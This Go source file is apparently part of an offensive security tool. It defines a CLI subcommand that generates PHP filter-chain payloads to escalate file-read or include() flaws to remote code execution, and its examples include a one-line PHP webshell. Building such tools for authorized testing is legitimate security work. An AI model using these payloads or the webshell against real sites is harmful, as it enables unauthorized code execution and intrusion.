package cli

import (
	"fmt"

	"github.com/bugsyhewitt/exhumed/internal/phpfilter"
	"github.com/spf13/cobra"
)

// newPayloadCmd is the parent for payload-generation subcommands. Payload
// generators emit a string the operator places into a vulnerable parameter;
// they perform no network I/O and confirm nothing themselves.
func newPayloadCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "payload",
		Short: "Generate exploitation payloads (e.g. PHP filter chains for RCE escalation)",
	}
	cmd.AddCommand(newPHPFilterCmd())
	return cmd
}

func newPHPFilterCmd() *cobra.Command {
	var (
		rce      string
		resource string
		rawB64   string
		debug    bool
	)

	cmd := &cobra.Command{
		Use:   "php-filter",
		Short: "Generate a php://filter chain that turns a file-read into arbitrary content (RCE via include())",
		Long: `php-filter generates a PHP filter chain using the convert.iconv technique
(loknop / synacktiv). When a target include()/require()s a parameter you control,
the chain reconstructs an arbitrary payload — typically a PHP webshell — from a
resource whose original contents are irrelevant, escalating a file-read primitive
to remote code execution.

The output is a single php://filter/... string. exhumed only GENERATES it; you
place it into the vulnerable parameter yourself. No network access occurs.

Examples:
  exhumed payload php-filter --rce '<?php system($_GET[0]);?>'
  exhumed payload php-filter --rce '<?=phpinfo();?>' --resource php://temp
  exhumed payload php-filter --raw-base64 PD9waHAgcGhwaW5mbygpOz8+ --debug

LEGAL NOTICE: authorized testing only.`,
		RunE: func(cmd *cobra.Command, args []string) error {
			if rce == "" && rawB64 == "" {
				return fmt.Errorf("one of --rce or --raw-base64 is required")
			}
			if rce != "" && rawB64 != "" {
				return fmt.Errorf("--rce and --raw-base64 are mutually exclusive")
			}

			var (
				chain string
				err   error
			)
			if rawB64 != "" {
				// Debugging path: build from a pre-encoded base64 string. --debug
				// emits a chain that surfaces the reconstructed base64 (no final
				// decode) so the operator can verify it against the target first.
				chain, err = phpfilter.GenerateFromBase64(rawB64, resource, !debug)
			} else {
				chain, err = phpfilter.Generate(rce, resource)
			}
			if err != nil {
				return fmt.Errorf("generate php filter chain: %w", err)
			}

			fmt.Fprintln(cmd.OutOrStdout(), chain)
			return nil
		},
	}

	cmd.Flags().StringVar(&rce, "rce", "", "raw payload to reconstruct on the target (e.g. a PHP webshell)")
	cmd.Flags().StringVar(&rawB64, "raw-base64", "", "pre-encoded base64 payload (debug/verification mode)")
	cmd.Flags().StringVar(&resource, "resource", "", "the php://filter resource sink (default php://temp)")
	cmd.Flags().BoolVar(&debug, "debug", false, "with --raw-base64, omit the terminal decode so the chain surfaces base64 for verification")
	return cmd
}
